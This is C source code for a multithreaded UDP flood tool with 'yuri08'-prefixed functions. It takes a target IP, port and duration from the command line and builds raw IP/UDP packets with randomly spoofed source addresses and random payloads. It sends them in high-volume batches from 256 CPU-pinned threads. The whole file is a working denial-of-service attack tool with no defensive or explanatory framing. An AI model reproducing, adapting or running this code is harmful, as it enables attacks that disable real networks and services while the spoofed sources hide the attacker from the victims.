#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sched.h>
#include <sys/resource.h>
#include <numa.h>

#define MAX_PACKET_SIZE 1472
#define NUM_THREADS 256
#define BATCH_SIZE 64
#define NUMA_NODES 1

struct yuri08_data {
    char *target_ip;
    int target_port;
    int duration;
    unsigned long *packets_sent;
    int cpu_id;
    int node;
};

void yuri08_set_affinity(int cpu_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

unsigned short yuri08_checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *yuri08_flood(void *arg) {
    struct yuri08_data *data = (struct yuri08_data *)arg;
    int sockfd;
    char packet[MAX_PACKET_SIZE];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header = (struct iphdr *)packet;
    struct udphdr *udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    time_t end_time;
    struct mmsghdr messages[BATCH_SIZE];
    struct iovec iov[BATCH_SIZE];
    char packets[BATCH_SIZE][MAX_PACKET_SIZE] __attribute__((aligned(64)));

    yuri08_set_affinity(data->cpu_id);
    numa_set_preferred(data->node);

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &target_addr.sin_addr);

    srand(time(NULL) ^ pthread_self());
    end_time = time(NULL) + data->duration;

    for (int i = 0; i < BATCH_SIZE; i++) {
        memset(&messages[i], 0, sizeof(struct mmsghdr));
        messages[i].msg_hdr.msg_iov = &iov[i];
        messages[i].msg_hdr.msg_iovlen = 1;
        messages[i].msg_hdr.msg_name = &target_addr;
        messages[i].msg_hdr.msg_namelen = sizeof(target_addr);

        iov[i].iov_base = packets[i];
        iov[i].iov_len = MAX_PACKET_SIZE;
    }

    while (time(NULL) < end_time) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            struct iphdr *ip = (struct iphdr *)packets[i];
            struct udphdr *udp = (struct udphdr *)(packets[i] + sizeof(struct iphdr));
            char *pl = packets[i] + sizeof(struct iphdr) + sizeof(struct udphdr);

            ip->ihl = 5;
            ip->version = 4;
            ip->tos = 0;
            ip->tot_len = htons(MAX_PACKET_SIZE);
            ip->id = htons(rand());
            ip->frag_off = 0;
            ip->ttl = 64;
            ip->protocol = IPPROTO_UDP;
            ip->check = 0;
            ip->saddr = rand();
            ip->daddr = target_addr.sin_addr.s_addr;
            ip->check = yuri08_checksum((unsigned short *)ip, sizeof(struct iphdr));

            udp->source = htons(rand());
            udp->dest = htons(data->target_port);
            udp->len = htons(MAX_PACKET_SIZE - sizeof(struct iphdr));
            udp->check = 0;

            for (int j = 0; j < MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr); j++) {
                pl[j] = rand() % 256;
            }
        }

        int sent = sendmmsg(sockfd, messages, BATCH_SIZE, MSG_DONTWAIT);
        if (sent > 0) {
            __sync_add_and_fetch(data->packets_sent, sent);
        }
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        return 1;
    }

    struct rlimit rlim;
    rlim.rlim_cur = 1024;
    rlim.rlim_max = 1024;
    setrlimit(RLIMIT_NOFILE, &rlim);

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    pthread_t threads[NUM_THREADS];
    struct yuri08_data data[NUM_THREADS];
    unsigned long packets_sent = 0;

    for (int i = 0; i < NUM_THREADS; i++) {
        data[i].target_ip = target_ip;
        data[i].target_port = target_port;
        data[i].duration = duration;
        data[i].packets_sent = &packets_sent;
        data[i].cpu_id = i % sysconf(_SC_NPROCESSORS_ONLN);
        data[i].node = i % NUMA_NODES;
        pthread_create(&threads[i], NULL, yuri08_flood, &data[i]);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}